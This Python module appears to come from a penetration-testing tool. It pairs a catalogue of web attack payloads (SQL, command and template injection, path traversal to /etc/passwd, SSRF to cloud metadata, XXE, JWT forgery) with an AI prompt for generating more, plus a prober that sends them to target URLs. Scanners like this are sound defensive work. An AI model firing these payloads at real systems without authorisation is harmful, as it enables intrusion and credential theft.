"""AI-assisted payload generation and safe proof-of-concept probing.

The generator combines a curated, offline catalogue with provider-generated
payloads (Gemini / OpenAI / Claude / Groq / DeepSeek / OpenRouter / Mistral /
Together / Ollama).  AI output is parsed defensively: if the model returns
malformed JSON the curated catalogue is still returned.

Only use the probing helpers against systems you own or are explicitly
authorised to test.
"""

from __future__ import annotations

import json
import os
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

# ---------------------------------------------------------------------------
# Curated offline catalogue (always available, even without an AI provider)
# ---------------------------------------------------------------------------

CATALOG: Dict[str, List[Dict[str, str]]] = {
    "sqli": [
        {"payload": "' OR '1'='1", "technique": "boolean", "notes": "classic tautology"},
        {"payload": "' OR 1=1-- -", "technique": "boolean", "notes": "comment-terminated"},
        {"payload": "1' AND 1=1-- -", "technique": "boolean", "notes": "true condition"},
        {"payload": "1' AND 1=2-- -", "technique": "boolean", "notes": "false condition"},
        {"payload": "' UNION SELECT NULL-- -", "technique": "union", "notes": "column count probe"},
        {"payload": "' UNION SELECT 1,2,3-- -", "technique": "union", "notes": "data extraction"},
        {"payload": "1' ORDER BY 1-- -", "technique": "order-by", "notes": "column counting"},
        {"payload": "1' AND SLEEP(5)-- -", "technique": "time", "notes": "MySQL time-based"},
        {"payload": "1'; WAITFOR DELAY '0:0:5'-- -", "technique": "time", "notes": "MSSQL time-based"},
        {"payload": "1' OR pg_sleep(5)-- -", "technique": "time", "notes": "PostgreSQL time-based"},
        {"payload": "admin'-- -", "technique": "auth-bypass", "notes": "login bypass"},
    ],
    "xss": [
        {"payload": "<script>alert(1)</script>", "technique": "reflected", "notes": "classic"},
        {"payload": "\"><script>alert(1)</script>", "technique": "reflected", "notes": "attribute break"},
        {"payload": "'><img src=x onerror=alert(1)>", "technique": "reflected", "notes": "image error"},
        {"payload": "javascript:alert(1)", "technique": "href", "notes": "javascript URI"},
        {"payload": "<svg onload=alert(1)>", "technique": "reflected", "notes": "SVG vector"},
        {"payload": "<body onload=alert(1)>", "technique": "reflected", "notes": "body handler"},
        {"payload": "\"><svg/onload=alert(1)>", "technique": "reflected", "notes": "quote break + SVG"},
        {"payload": "{{7*7}}", "technique": "ssti-check", "notes": "template reflection check"},
    ],
    "ssti": [
        {"payload": "{{7*7}}", "technique": "jinja2/twig", "notes": "expect 49"},
        {"payload": "${7*7}", "technique": "freemarker", "notes": "expect 49"},
        {"payload": "#{7*7}", "technique": "ruby", "notes": "expect 49"},
        {"payload": "%{7*7}", "technique": "erb", "notes": "expect 49"},
        {"payload": "{{7*'7'}}", "technique": "jinja2", "notes": "expect 7777777"},
        {"payload": "<%= 7*7 %>", "technique": "erb", "notes": "expect 49"},
    ],
    "lfi": [
        {"payload": "../../../../etc/passwd", "technique": "traversal", "notes": "Linux"},
        {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "technique": "encoded", "notes": "URL encoded"},
        {"payload": "....//....//....//etc/passwd", "technique": "bypass", "notes": "filter bypass"},
        {"payload": "/etc/passwd%00", "technique": "null-byte", "notes": "legacy PHP"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "technique": "wrapper", "notes": "PHP wrapper"},
        {"payload": "..\\..\\..\\windows\\win.ini", "technique": "traversal", "notes": "Windows"},
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1:80/", "technique": "loopback", "notes": "local service"},
        {"payload": "http://localhost:22", "technique": "loopback", "notes": "SSH banner"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "metadata", "notes": "AWS metadata"},
        {"payload": "http://metadata.google.internal/computeMetadata/v1/", "technique": "metadata", "notes": "GCP metadata"},
        {"payload": "file:///etc/passwd", "technique": "file-scheme", "notes": "local file"},
        {"payload": "gopher://127.0.0.1:6379/_PING", "technique": "gopher", "notes": "Redis probe"},
        {"payload": "http://[::1]:80/", "technique": "ipv6-loopback", "notes": "IPv6 bypass"},
    ],
    "cmdi": [
        {"payload": "; id", "technique": "shell", "notes": "semicolon"},
        {"payload": "| id", "technique": "shell", "notes": "pipe"},
        {"payload": "&& id", "technique": "shell", "notes": "AND chain"},
        {"payload": "`id`", "technique": "shell", "notes": "backticks"},
        {"payload": "$(id)", "technique": "shell", "notes": "subshell"},
        {"payload": "%3Bid", "technique": "encoded", "notes": "URL encoded"},
        {"payload": "test; sleep 5", "technique": "time", "notes": "blind delay"},
    ],
    "xxe": [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "technique": "file-read", "notes": "classic XXE"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>', "technique": "ssrf", "notes": "OOB HTTP"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/e.dtd">%xxe;]><foo/>', "technique": "oob", "notes": "parameter entity"},
    ],
    "nosqli": [
        {"payload": '{"$ne": null}', "technique": "operator", "notes": "MongoDB auth bypass"},
        {"payload": '{"$gt": ""}', "technique": "operator", "notes": "MongoDB comparison"},
        {"payload": "admin' || '1'=='1", "technique": "injection", "notes": "string injection"},
        {"payload": '{"username": {"$regex": "^a"}}', "technique": "regex", "notes": "regex extraction"},
        {"payload": "true, $where: '1 == 1'", "technique": "where", "notes": "JS where"},
    ],
    "ldap": [
        {"payload": "*)(uid=*", "technique": "filter", "notes": "wildcard injection"},
        {"payload": "*)(|(password=*))", "technique": "filter", "notes": "password dump"},
        {"payload": "admin)(&(1=1", "technique": "filter", "notes": "auth bypass"},
    ],
    "graphql": [
        {"payload": "{__schema{types{name}}}", "technique": "introspection", "notes": "schema dump"},
        {"payload": "query{__typename}", "technique": "introspection", "notes": "minimal probe"},
        {"payload": "{user(id:1){id,email,role}}", "technique": "idor", "notes": "object access"},
    ],
    "jwt": [
        {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.", "technique": "none-alg", "notes": "unsigned token"},
        {"payload": "change-alg-to-HS256-then-brute-secret", "technique": "alg-confusion", "notes": "needs wordlist"},
        {"payload": "kid=../../../../etc/passwd", "technique": "kid-injection", "notes": "header injection"},
    ],
    "open_redirect": [
        {"payload": "https://evil.example", "technique": "absolute", "notes": "external URL"},
        {"payload": "//evil.example", "technique": "protocol-relative", "notes": "scheme-relative"},
        {"payload": "/\\evil.example", "technique": "backslash", "notes": "parser confusion"},
        {"payload": "%2F%2Fevil.example", "technique": "encoded", "notes": "double encoding"},
    ],
    "crlf": [
        {"payload": "%0d%0aSet-Cookie: hacked=1", "technique": "header-injection", "notes": "CRLF"},
        {"payload": "%E5%98%8A%E5%98%8DSet-Cookie: hacked=1", "technique": "unicode", "notes": "UTF-8 CRLF"},
    ],
}

ALIASES = {
    "sql": "sqli",
    "sql-injection": "sqli",
    "xss": "xss",
    "cross-site-scripting": "xss",
    "command": "cmdi",
    "rce": "cmdi",
    "cmd": "cmdi",
    "command-injection": "cmdi",
    "path-traversal": "lfi",
    "traversal": "lfi",
    "local-file-inclusion": "lfi",
    "server-side-request-forgery": "ssrf",
    "template-injection": "ssti",
    "xml-external-entity": "xxe",
    "nosql": "nosqli",
    "open-redirect": "open_redirect",
    "redirect": "open_redirect",
    "header-injection": "crlf",
}

AI_SYSTEM_PROMPT = """You are HackIt Payload Forge, an expert offensive-security researcher.
Generate concrete, testable proof-of-concept payloads for AUTHORISED security testing.

Rules:
- Return ONLY a valid JSON object, no markdown fences and no commentary.
- Schema: {"payloads":[{"payload":"...","technique":"...","notes":"..."}]}
- Include payloads for the requested vulnerability class and context.
- Prefer minimal, reliable payloads with a clear detection signal.
- Never include destructive payloads (no DROP TABLE, no rm -rf, no fork bombs).
- Keep every payload on one line. Escape JSON strings correctly.
"""

ERROR_SIGNATURES: Dict[str, List[str]] = {
    "sqli": [
        "sql syntax", "mysql", "syntax error", "unclosed quotation", "odbc",
        "ora-", "postgresql", "sqlite", "microsoft ole db", "division by zero",
        "unexpected end of sql", "warning: mysql", "you have an error in your sql",
    ],
    "lfi": ["root:x:0:0", "[extensions]", "for 16-bit app support"],
    "cmdi": ["uid=", "gid=", "root:", "volume serial number"],
    "ssti": ["49", "7777777"],
    "xxe": ["root:x:0:0", "for 16-bit app support"],
    "nosqli": [
        "mongoerror", "mongoservererror", "e11000", "bson",
        "cast to objectid", "unknown operator: $", "cannot apply $",
    ],
    "ssrf": [
        "ami-id", "instance-id", "iam/security-credentials", "root:x:0:0",
        "redis_version", "ssh-2.0-", "metadata.google.internal",
    ],
    "ldap": ["ldaperror", "invalid dn syntax", "protocol error"],
}


def normalize_type(vuln_type: str) -> str:
    value = (vuln_type or "").strip().lower().replace(" ", "-")
    return ALIASES.get(value, value)


def catalog_types() -> List[str]:
    return sorted(CATALOG.keys())


def local_payloads(vuln_type: str, limit: int = 24) -> List[Dict[str, str]]:
    vuln_type = normalize_type(vuln_type)
    return [dict(item) for item in CATALOG.get(vuln_type, [])[:limit]]


_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")


def _clean_ai_text(text: str) -> str:
    """Remove colours and reasoning wrappers from an engine response."""
    cleaned = _ANSI_RE.sub("", text or "")
    cleaned = re.sub(r"<(?:think|thinking|reasoning)>.*?</(?:think|thinking|reasoning)>",
                     "", cleaned, flags=re.IGNORECASE | re.DOTALL)
    return cleaned.strip()


def _extract_json(text: str) -> Optional[Dict[str, Any]]:
    if not text:
        return None
    cleaned = _clean_ai_text(text)
    cleaned = re.sub(r"^```(?:json)?", "", cleaned, flags=re.IGNORECASE).strip()
    cleaned = re.sub(r"```$", "", cleaned).strip()
    candidates = [cleaned]
    start, end = cleaned.find("{"), cleaned.rfind("}")
    if start >= 0 and end > start:
        candidates.append(cleaned[start:end + 1])
    # Some models return a bare array, optionally surrounded by prose.
    list_start, list_end = cleaned.find("["), cleaned.rfind("]")
    if list_start >= 0 and list_end > list_start:
        candidates.append(cleaned[list_start:list_end + 1])
    for candidate in candidates:
        try:
            data = json.loads(candidate)
            if isinstance(data, dict):
                return data
            if isinstance(data, list):
                return {"payloads": data}
        except (ValueError, TypeError):
            continue
    return None


def _regex_payloads(text: str) -> List[Dict[str, str]]:
    """Salvage payloads from truncated or slightly malformed model JSON.

    Local models occasionally close a JSON array incorrectly.  The payload
    values themselves are still readable, so recovering them is better than
    discarding the whole response.
    """
    cleaned = _clean_ai_text(text)
    results: List[Dict[str, str]] = []
    pattern = re.compile(r'"payload"\s*:\s*"((?:[^"\\]|\\.)*)"')
    for match in pattern.finditer(cleaned):
        raw = match.group(1)
        try:
            payload = json.loads(f'"{raw}"')
        except (ValueError, TypeError):
            payload = raw
        payload = str(payload).strip()
        if not payload or len(payload) > 4096:
            continue
        if any(item["payload"] == payload for item in results):
            continue
        results.append({"payload": payload, "technique": "ai", "notes": "", "type": ""})
    return results


def _coerce_ai_payloads(text: str) -> List[Dict[str, str]]:
    data = _extract_json(text)
    if not data:
        return _regex_payloads(text)
    items = data.get("payloads") or data.get("payload") or []
    if isinstance(items, dict):
        items = [items]
    if not isinstance(items, list):
        items = []
    result: List[Dict[str, str]] = []
    for item in items:
        if isinstance(item, str):
            result.append({"payload": item, "technique": "ai", "notes": "", "type": ""})
            continue
        if not isinstance(item, dict):
            continue
        payload = item.get("payload") or item.get("value") or item.get("code")
        if not payload:
            continue
        result.append({
            "payload": str(payload).strip(),
            "technique": str(item.get("technique", "ai")).strip() or "ai",
            "notes": str(item.get("notes", "")).strip(),
            "type": normalize_type(str(item.get("type", "")).strip()),
        })
    if not result:
        return _regex_payloads(text)
    return result


def _dedupe(items: Iterable[Dict[str, str]]) -> List[Dict[str, str]]:
    seen = set()
    result = []
    for item in items:
        payload = item.get("payload", "").strip()
        if not payload or payload in seen:
            continue
        if len(payload) > 4096:
            continue
        seen.add(payload)
        result.append(item)
    return result


def _default_ai_call(timeout: int = 300) -> Callable[[str, str], str]:
    from .brain import AIHyperBrain  # local import to avoid cycles

    brain = AIHyperBrain(engine="native", enable_memory=False, announce=False)

    def caller(prompt: str, system: str) -> str:
        return brain.raw_query(prompt, system_prompt=system, mode="payload", timeout=timeout)

    return caller


def _resolve_ai(ai_call: Optional[Callable[[str, str], str]]) -> Tuple[
        Callable[[str, str], str], str, str]:
    """Return ``(caller, provider, model)`` for payload generation.

    The provider/model are surfaced in the result so callers can show which
    model actually produced the payloads.  When a custom ``ai_call`` is passed
    (tests, alternate backends) the metadata stays blank.
    """
    if ai_call is not None:
        return ai_call, "", ""
    from .brain import AIHyperBrain  # local import to avoid cycles

    brain = AIHyperBrain(engine="native", enable_memory=False, announce=False)

    def caller(prompt: str, system: str) -> str:
        return brain.raw_query(prompt, system_prompt=system, mode="payload", timeout=300)

    return caller, brain.provider, brain.model


def _ai_error_message(text: str, parsing_failed: bool) -> str:
    """Turn an engine reply into a short, user-actionable error string."""
    cleaned = _clean_ai_text(text)
    if not cleaned:
        return "AI provider returned an empty response"
    if cleaned.startswith("[!]"):
        return cleaned[:240]
    if parsing_failed:
        excerpt = " ".join(cleaned.split())[:200]
        return f"AI response was not valid payload JSON: {excerpt}"
    return ""


def generate(vuln_type: str, context: str = "", count: int = 12,
             ai_call: Optional[Callable[[str, str], str]] = None,
             use_ai: bool = True, provider: str = "", model: str = "") -> Dict[str, Any]:
    """Generate payloads for one vulnerability class.

    AI payloads are requested whenever ``use_ai`` is true.  On any provider or
    parsing failure the curated offline catalogue is still returned, so payload
    generation works even without an API key or network connection.
    """
    vuln_type = normalize_type(vuln_type)
    count = max(1, min(int(count or 12), 50))
    curated = local_payloads(vuln_type, limit=count)
    items: List[Dict[str, str]] = []
    source = "curated"
    ai_error = ""

    if use_ai:
        try:
            caller, ai_provider, ai_model = _resolve_ai(ai_call)
            provider = provider or ai_provider
            model = model or ai_model
            local_cap = 4 if provider == "ollama" else 12
            request_count = max(3, min(count, local_cap))
            prompt = (
                f"Vulnerability class: {vuln_type}\n"
                f"Target/context: {context or 'generic web application'}\n"
                f"Generate {request_count} concrete proof-of-concept payloads for this class.\n"
                f"Respond with ONLY the JSON object described in the system prompt."
            )
            text = caller(prompt, AI_SYSTEM_PROMPT) or ""
            ai_items = _coerce_ai_payloads(text)
            if ai_items:
                for item in ai_items:
                    item.pop("type", None)
                # Keep proven curated payloads in the result even when the
                # model returns a full set; AI additions follow them.
                half = max(1, count // 2)
                items = _dedupe(curated[:half] + ai_items + curated[half:])
                source = "ai+curated" if curated else "ai"
            else:
                ai_error = _ai_error_message(text, parsing_failed=True)
        except Exception as exc:  # noqa: BLE001 - generation must not crash
            ai_error = str(exc)[:240]

    if not items:
        items = curated

    return {
        "type": vuln_type,
        "context": context,
        "provider": provider,
        "model": model,
        "source": source,
        "payloads": items[:count],
        "ai_error": ai_error,
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }


def generate_multi(types: Iterable[str], context: str = "", count: int = 8,
                   ai_call: Optional[Callable[[str, str], str]] = None,
                   use_ai: bool = True, provider: str = "", model: str = "") -> Dict[str, Any]:
    """Generate payloads for several classes using one AI request.

    A single request keeps the autonomous pipeline fast while still letting the
    model return class-specific payloads (the ``type`` field in each JSON item).
    """
    normalized: List[str] = []
    for vuln_type in types:
        normalized_type = normalize_type(vuln_type)
        if normalized_type and normalized_type not in normalized:
            normalized.append(normalized_type)
    count = max(1, min(int(count or 8), 50))

    results: Dict[str, Any] = {}
    for vuln_type in normalized:
        curated = local_payloads(vuln_type, limit=count)
        results[vuln_type] = {
            "type": vuln_type,
            "context": context,
            "provider": provider,
            "model": model,
            "source": "curated",
            "payloads": curated,
            "ai_error": "",
            "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }

    ai_error = ""
    if use_ai and normalized:
        try:
            caller, ai_provider, ai_model = _resolve_ai(ai_call)
            provider = provider or ai_provider
            model = model or ai_model
            # Local models are fast at a few short JSON items but time out on
            # a six-class catalogue.  Generate AI payloads for the single most
            # relevant class and keep proven curated payloads for the rest.
            ai_types = normalized[:1] if provider == "ollama" else normalized
            per_type = 2
            context_cap = 2500 if provider == "ollama" else 4000
            compact_context = (context or "generic web application")[:context_cap]
            prompt = (
                "Generate authorised proof-of-concept payloads for these vulnerability classes:\n"
                + ", ".join(ai_types)
                + f"\nTarget/context: {compact_context}\n"
                + f"Return exactly {per_type} payloads per class. "
                + "Every item MUST include a `type` field exactly matching one of the classes above. "
                + "Respond with ONLY the JSON object described in the system prompt."
            )
            text = caller(prompt, AI_SYSTEM_PROMPT) or ""
            ai_items = _coerce_ai_payloads(text)
            if ai_items:
                grouped: Dict[str, List[Dict[str, str]]] = {vuln_type: [] for vuln_type in ai_types}
                for item in ai_items:
                    item_type = item.pop("type", "") or ai_types[0]
                    if item_type not in grouped:
                        item_type = ai_types[0]
                    grouped[item_type].append(item)
                for vuln_type, extra in grouped.items():
                    if not extra:
                        continue
                    curated = results[vuln_type]["payloads"]
                    half = max(1, count // 2)
                    results[vuln_type]["payloads"] = _dedupe(
                        curated[:half] + extra + curated[half:]
                    )[:count]
                    results[vuln_type]["source"] = "ai+curated" if curated else "ai"
            else:
                ai_error = _ai_error_message(text, parsing_failed=True)
        except Exception as exc:  # noqa: BLE001
            ai_error = str(exc)[:240]

    for result in results.values():
        result["provider"] = provider
        result["model"] = model
        if ai_error:
            result["ai_error"] = ai_error

    return {
        "results": results,
        "types": normalized,
        "context": context,
        "provider": provider,
        "model": model,
        "source": "ai+curated" if any(r["source"].startswith("ai") for r in results.values()) else "curated",
        "ai_error": ai_error,
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }


def render_markdown(results: Dict[str, Any]) -> str:
    lines = ["# HackIt Payload Forge", ""]
    generated = results.get("generated_at") or results.get("results", {}).get("generated_at", "")
    if generated:
        lines.append(f"**Generated:** {generated}")
    if "results" in results:
        groups = results["results"]
    else:
        groups = {results.get("type", "payload"): results}

    for vuln_type, data in groups.items():
        lines.extend(["", f"## {vuln_type.upper()}", ""])
        if isinstance(data, dict):
            if data.get("context"):
                lines.append(f"**Context:** {data['context']}")
            if data.get("source"):
                lines.append(f"**Source:** {data['source']}")
            if data.get("provider") or data.get("model"):
                lines.append(
                    f"**Provider:** {data.get('provider') or 'auto'} "
                    f" / **Model:** {data.get('model') or 'auto'}"
                )
            if data.get("ai_error"):
                lines.append(f"**AI note:** {data['ai_error']}")
            lines.append("")
            lines.append("| # | Payload | Technique | Notes |")
            lines.append("|---|---------|-----------|-------|")
            for idx, item in enumerate(data.get("payloads", []), 1):
                payload = str(item.get("payload", "")).replace("|", "\\|")
                technique = str(item.get("technique", "")).replace("|", "\\|")
                notes = str(item.get("notes", "")).replace("|", "\\|")
                lines.append(f"| {idx} | `{payload}` | {technique} | {notes} |")
    return "\n".join(lines).strip() + "\n"


def save(results: Dict[str, Any], path: str) -> str:
    with open(path, "w", encoding="utf-8") as handle:
        if path.lower().endswith(".md"):
            handle.write(render_markdown(results))
        else:
            json.dump(results, handle, indent=2, ensure_ascii=False)
    return path


# ---------------------------------------------------------------------------
# Probing
# ---------------------------------------------------------------------------


@dataclass
class ProbeResult:
    target: str
    parameter: str
    payload: str
    vulnerable: bool
    evidence: str
    status_code: int = 0
    baseline_status: int = 0
    elapsed_ms: int = 0
    reflected: bool = False
    error_signature: str = ""
    detail: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "parameter": self.parameter,
            "payload": self.payload,
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "status_code": self.status_code,
            "baseline_status": self.baseline_status,
            "elapsed_ms": self.elapsed_ms,
            "reflected": self.reflected,
            "error_signature": self.error_signature,
            "detail": self.detail,
        }


def _baseline(target: str, parameter: str, timeout: float) -> Dict[str, Any]:
    try:
        response = requests.get(target, timeout=timeout, allow_redirects=True)
        return {
            "status": response.status_code,
            "body": response.text[:200000],
            "url": response.url,
            "content_type": response.headers.get("Content-Type", ""),
        }
    except Exception:
        return {"status": 0, "body": "", "url": target, "content_type": ""}


def _url_host(value: str) -> str:
    try:
        return (urlparse(value).hostname or "").lower()
    except ValueError:
        return ""


def _replace_parameter(target: str, parameter: str, payload: str) -> str:
    """Return ``target`` with ``parameter`` set to ``payload``.

    Appending a second copy of the parameter (the previous behaviour) meant
    many servers simply read the first, original value and the probe never
    reached the injection point.
    """
    parts = urlparse(target)
    query = [
        (key, value)
        for key, value in parse_qsl(parts.query, keep_blank_values=True)
        if key != parameter
    ]
    query.append((parameter, payload))
    return urlunparse((
        parts.scheme,
        parts.netloc,
        parts.path,
        parts.params,
        urlencode(query, doseq=True),
        parts.fragment,
    ))


def probe(target: str, vuln_type: str, payload: str, parameter: str = "",
          method: str = "GET", timeout: float = 10.0,
          headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Send one payload and compare the response with a baseline."""
    vuln_type = normalize_type(vuln_type)
    headers = headers or {}
    baseline = _baseline(target, parameter, timeout)
    baseline_status = int(baseline.get("status", 0))
    baseline_body = str(baseline.get("body", ""))
    baseline_url = str(baseline.get("url", target))
    baseline_lower = baseline_body.lower()

    url = target
    data = None
    try:
        if parameter:
            if method.upper() == "GET":
                url = _replace_parameter(target, parameter, payload)
            else:
                data = {parameter: payload}
        started = time.time()
        response = requests.request(
            method.upper(), url, data=data, headers=headers, timeout=timeout, allow_redirects=True
        )
        elapsed_ms = int((time.time() - started) * 1000)
        body = response.text[:200000]
        content_type = response.headers.get("Content-Type", "").lower()
    except Exception as exc:  # noqa: BLE001
        return ProbeResult(
            target=target, parameter=parameter, payload=payload, vulnerable=False,
            evidence=f"request failed: {exc}", detail={"error": str(exc)},
        ).to_dict()

    reflected = payload in body
    signature = ""
    for marker in ERROR_SIGNATURES.get(vuln_type, []):
        # A signature that is already present in the baseline is not evidence.
        if marker.lower() in body.lower() and marker.lower() not in baseline_lower:
            signature = marker
            break

    time_based = any(token in payload.lower() for token in ("sleep(", "pg_sleep", "waitfor delay"))
    delay_signal = time_based and elapsed_ms >= 4500
    status_signal = response.status_code >= 500 and baseline_status < 500
    length_delta = abs(len(body) - len(baseline_body))
    length_signal = bool(baseline_body) and length_delta > max(512, len(baseline_body) * 0.35)
    redirect_signal = (
        vuln_type == "open_redirect"
        and response.url != baseline_url
        and _url_host(response.url) not in ("", _url_host(target))
    )
    reflection_signal = (
        reflected
        and vuln_type in ("xss", "ssti", "crlf")
        and ("html" in content_type or not content_type)
    )

    signals = []
    if reflection_signal:
        signals.append("payload reflected unescaped in HTML")
    if signature:
        signals.append(f"new error signature '{signature}'")
    if delay_signal:
        signals.append(f"time delay {elapsed_ms}ms")
    if status_signal:
        signals.append(f"status {baseline_status}->{response.status_code}")
    if length_signal and not reflection_signal:
        signals.append(f"response length delta {length_delta}")
    if redirect_signal:
        signals.append(f"redirected off-host to {response.url}")

    # Only a concrete, reproducible indicator is allowed to make a finding.
    strong = bool(signature or delay_signal or redirect_signal or reflection_signal)
    if vuln_type in ("sqli", "nosqli", "ldap", "xxe", "lfi", "cmdi") and status_signal:
        # A 500 alone is ambiguous; it only supports an existing signature.
        strong = bool(signature or delay_signal)
    vulnerable = strong
    evidence = "; ".join(signals) if signals else "no differential signal"
    return ProbeResult(
        target=target,
        parameter=parameter,
        payload=payload,
        vulnerable=vulnerable,
        evidence=evidence,
        status_code=response.status_code,
        baseline_status=baseline_status,
        elapsed_ms=elapsed_ms,
        reflected=reflected,
        error_signature=signature,
        detail={"length_delta": length_delta, "redirected_to": response.url if redirect_signal else ""},
    ).to_dict()


def probe_many(target: str, vuln_type: str, payloads: Iterable[str], parameter: str = "",
               method: str = "GET", timeout: float = 10.0, delay: float = 0.25,
               on_result: Optional[Callable[[Dict[str, Any]], None]] = None) -> List[Dict[str, Any]]:
    results = []
    for payload in payloads:
        result = probe(target, vuln_type, payload, parameter=parameter, method=method, timeout=timeout)
        results.append(result)
        if on_result:
            on_result(result)
        if delay:
            time.sleep(delay)
    return results


def summarize_probe(results: List[Dict[str, Any]]) -> str:
    vulnerable = [item for item in results if item.get("vulnerable")]
    if not vulnerable:
        return f"No differential signal across {len(results)} payload(s)."
    lines = [f"{len(vulnerable)}/{len(results)} payload(s) produced a signal:"]
    for item in vulnerable[:8]:
        lines.append(f"- {item['payload']} -> {item['evidence']}")
    return "\n".join(lines)
